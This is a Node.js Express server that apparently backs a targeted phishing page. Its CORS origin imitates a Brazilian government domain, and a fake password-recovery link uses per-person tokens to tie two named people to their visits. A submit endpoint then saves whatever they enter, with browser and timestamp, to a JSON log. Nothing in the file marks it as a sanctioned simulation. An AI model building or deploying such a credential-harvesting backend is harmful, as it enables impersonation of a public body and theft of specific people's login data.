const express = require("express");
const fs = require("fs");
const cors = require("cors");
const { connect } = require("http2");
const app = express();
const path = require("path");
const port = 80;

app.use(cors({
  origin: "https://ssc-prodemge-gov-br.onrender.com:443",
}));

app.use(express.json());

// Variáveis globais para salvar os usuários
let usuariojener = [];
let usuariogislene = [];
let usuario;

// Define a rota para a raiz que serve o index.html
app.get("/passwordrecovery", function (req, res) {

  let token = req.query.token

  if(token == "LBtFaTbdciuo9ll62SgYYTSMJwecXTT4o4QRv1nbWuc") {
    usuario = "Jener"
  } 

   if(token == "NfV3kP8sZ6LrYt5wQb2UxAeJd9GhKmCvXyqR4TzS1Bo") {
    usuario = "Gislene"
  } 

  res.redirect("/")

});

app.get("/", function (req, res){
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

/*
app.get("/log", function (req, res){
  res.sendFile(path.join(__dirname, "public", "registros.json"));
});*/

app.post("/submit", (req, res) => {
  const { dado, origem, dataHora, navegador } = req.body;

  let registros = [];

  try {
    registros = JSON.parse(fs.readFileSync("/public/registros.json", "utf-8"));
  } catch (err) {
    console.log("Arquivo vazio ou inválido, criando novo array.");
  }

  registros.push({ usuario, dado, origem, dataHora, navegador });

  fs.writeFileSync("./public/registros.json", JSON.stringify(registros, null, 2));

  res.status(200).json({ sucesso: true, recebido: dado });
});
// Variável para contar as requisições
let contador = 0;

// Middleware para incrementar o contador
app.use((req, res, next) => {
  contador++;
  console.log(contador);

  /*
  if (contador >= 500) {
    console.log("Treshold atingido");
    process.exit();
  }*/

  next(); // Continua o fluxo
}); 


// Serve arquivos estáticos da pasta "public"
app.use(express.static(path.join(__dirname, "public")));

// Start the server
app.listen(port, () => {
  console.log(`Server listening at http://localhost:${port}`);
});
